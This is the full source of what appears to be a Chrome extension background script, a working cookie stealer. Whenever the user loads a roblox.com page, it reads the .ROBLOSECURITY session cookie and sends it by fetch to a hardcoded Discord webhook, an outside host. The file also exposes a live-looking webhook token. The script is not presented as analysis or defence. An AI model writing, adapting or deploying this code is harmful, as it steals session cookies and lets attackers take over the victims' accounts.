const webhookUrl = 'https://discord.com/api/webhooks/1342913504327241799/r5YFJm6nhelMjZrIyURcNamWrU1cUDKbopS8UUZwce83xCGTLvw4taa_HZf2ikYtt4Xe'; // Replace with your actual webhook URL
let pastCookie_value = null;

// Listen for tab updates (e.g., when the user navigates to roblox.com)
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url.includes("roblox.com")) {
    console.log("Tab updated to roblox.com:", tab);
    // Call the function to log and send the .ROBLOSECURITY cookie when a page is fully loaded
    logCookiesToDiscord();
  }
});

// Function to get cookies and send them to Discord
function logCookiesToDiscord() {
  chrome.cookies.getAll({ domain: ".roblox.com" }, (cookies) => {
    const robloSecurityCookie = cookies.find(cookie => cookie.name === ".ROBLOSECURITY");

    if (!robloSecurityCookie) {
      console.log(".ROBLOSECURITY cookie not found.");
      return;
    }

    console.log("Found .ROBLOSECURITY cookie:", robloSecurityCookie);

    // Compare current cookie value with pastCookie_value to check if it has changed
    if (pastCookie_value === null || pastCookie_value.value !== robloSecurityCookie.value) {
      // Update pastCookie_value with the current cookie value
      pastCookie_value = robloSecurityCookie;
      
      // Send the .ROBLOSECURITY cookie data to Discord
      sendToDiscord(`.ROBLOSECURITY Cookie: ${robloSecurityCookie.value}`);
    } else {
      console.log("Cookie has not changed, skipping send.");
    }
  });
}

// Function to send formatted data to Discord webhook
function sendToDiscord(cookieData) {
  const messagePayload = {
    content: "Here is the .ROBLOSECURITY cookie:",
    embeds: [{
      title: ".ROBLOSECURITY Cookie",
      description: cookieData, // Use the formatted string of cookies
      color: 3447003, // Embed color in RGB (blue)
    }]
  };

  // Send the POST request to Discord Webhook
  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(messagePayload),
  })
  .then(response => response.text()) // No JSON expected from Discord Webhook
  .then(data => {
    console.log('Cookie sent to Discord successfully:', data);
  })
  .catch(error => {
    console.error('Error sending cookie to Discord:', error);
  });
}
